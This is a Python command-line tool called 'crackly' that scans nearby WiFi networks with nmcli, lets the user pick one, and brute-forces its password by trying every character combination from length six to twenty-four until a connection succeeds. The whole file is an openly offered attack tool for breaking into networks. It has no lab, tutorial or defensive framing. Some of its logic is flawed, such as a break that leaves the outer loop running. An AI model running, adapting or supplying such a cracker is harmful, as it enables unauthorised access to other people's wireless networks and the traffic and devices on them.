import sys
import subprocess
import shlex
import time
import itertools
import string

def remove_quotes(input_string):
    return input_string.replace("'", "").replace('"', "")


def remove_after_second_space(input_string):
    parts = input_string.split()
    
    result = ' '.join(parts[:2])
    
    return result


def remove_infra(input_string):
    return input_string.replace("Infra", "").strip()

def is_wifi_password_correct(ssid, password, timeout=5):
    # Command to connect to WiFi network using provided SSID and password
    cmd = f"nmcli device wifi connect '{ssid}' password '{password}'"

    # Attempt to connect to WiFi network with timeout
    start_time = time.time()
    process = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    
    while True:
        if process.poll() is not None:
            break
        
        if time.time() - start_time > timeout:
            process.terminate()
            process.communicate()  # Wait for process to terminate
            return False  # Return False if timeout is reached
        
        time.sleep(0.1)  # Check every 0.1 second
    
    # Check if connection was successful (you may need to customize this check based on your system)
    output, _ = process.communicate()
    if b"successfully activated" in output:
        return True
    else:
        return False

# Usage example
if __name__ == "__main__":

    print("")

    print("    _____                _    _           ")
    print("   / ____|              | |  | |          ")
    print("  | |     _ __ __ _  ___| | _| |_   _     ")
    print("  | |    | '__/ _` |/ __| |/ / | | | |    ")
    print("  | |____| | | (_| | (__|   <| | |_| |    ")
    print("   \_____|_|  \__,_|\___|_|\_\_|\__, |    ")
    print("                                 __/ |    ")
    print("                                |___/     ")

    print("")
    print("")

    all_chars = ''

    if len(sys.argv) < 1:
        print("Usage: python3 crackly.py")
        print("")
        print("python3 crackly.py --help")
        sys.exit(1)


    if len(sys.argv) == 2:
        if sys.argv[1] == '--help':
            print("  Usage: python3 crackly.py <SSID>")
            print("")
            print("  A third argument can be specified to include letters, digits or characters")
            print("")
            print("  Usage: python3 crackly.py <SSID> <Letters, Digits, Punctuation>")
            print("")
            print("  Usage: python3 crackly.py <SSID> ldp")
            print("  ldp - letters, digits, punctuation")
            print("")
            print("  Usage: python3 crackly.py <SSID> lp")
            print("  ldp - letters, punctuation")
            print("  Specify <ldp>, <lp>, <dp>, <l>, <p> to include what characters to include in the attack")
            sys.exit(1)
        elif sys.argv[1] in ['ldp', 'ld', 'l', 'lp', 'dp', 'p']:
            if sys.argv[1] == 'ldp':
                all_chars = string.ascii_letters + string.digits + string.punctuation
                print("  Trying letters, digits & punctuation")
                print("")
            elif sys.argv[1] == 'ld':
                all_chars = string.ascii_letters + string.digits
                print("  Trying letters & digits")
                print("")
            elif sys.argv[1] == 'l':
                all_chars = string.ascii_letters
                print("  Trying letters")
                print("")
            elif sys.argv[1] == 'lp':
                all_chars = string.ascii_letters + string.punctuation
                print("  Trying letters & punctuation")
                print("")
            elif sys.argv[1] == 'dp':
                all_chars = string.digits + string.punctuation
                print("  Digits & punctuation")
                print("")
            elif sys.argv[1] == 'p':
                all_chars = string.punctuation
                print("  Punctuation")
                print("")
    elif len(sys.argv) == 1 and not all_chars:
        all_chars = string.ascii_letters + string.digits + string.punctuation
        # Default character set

    timeout = 4 # Timeout in seconds

    print("  Scanning networks...")
    print("")

    result = subprocess.run(['nmcli', 'device', 'wifi', 'list'], capture_output=True, text=True)

    # Check if the command executed successfully
    if result.returncode == 0:
        lines = result.stdout.strip().split('\n')[2:]
        
        for idx, line in enumerate(lines, start=1):
            ssid = " ".join(line.split()[1:-4])
            ssid = remove_after_second_space(ssid)
            ssid = remove_infra(ssid)
            print(f"  {idx}. {ssid}")
    else:
        # Print an error message
        print("  Error:", result.stderr)

    print("")

    ssid_choice = input("  Choose SSID (enter the number): ")
    print("")

    # Validate the user's choice
    try:
        ssid_choice = int(ssid_choice)
        if ssid_choice < 1 or ssid_choice > idx:
            raise ValueError("Invalid choice")
    except ValueError:
        print("  Invalid input. Please enter a valid number.")
        sys.exit(1)

    # Get the selected SSID based on the user's choice
    selected_ssid = lines[ssid_choice - 1].split()[1]
    print(f"  You chose SSID: {selected_ssid}")
    print("")

    starting_check = input("  Starting number ?: y/n \n  ")
    print("")

    if starting_check == "N" or starting_check == "n":
        starting_number = 6

    else:
        starting_number = int(input("  Enter number: \n  "))
        print("")
        print(f"  Starting at number {starting_number}")
        print("")

    print("  ---------------------------------------------------")
    print(f"  |  Attempting to crack {selected_ssid}")
    print("  ---------------------------------------------------")
    print("")


    for length in range(starting_number, 25):
        for combo in itertools.product(all_chars, repeat=length):
            password = ''.join(combo)
            password = remove_quotes(password)
            print(f"  Attempting {password}")

            if is_wifi_password_correct(selected_ssid, password, timeout):
                print(f"  Cracked WiFi password - the key is: {password}")
                break
            else:
                print("  Incorrect")

            print("")
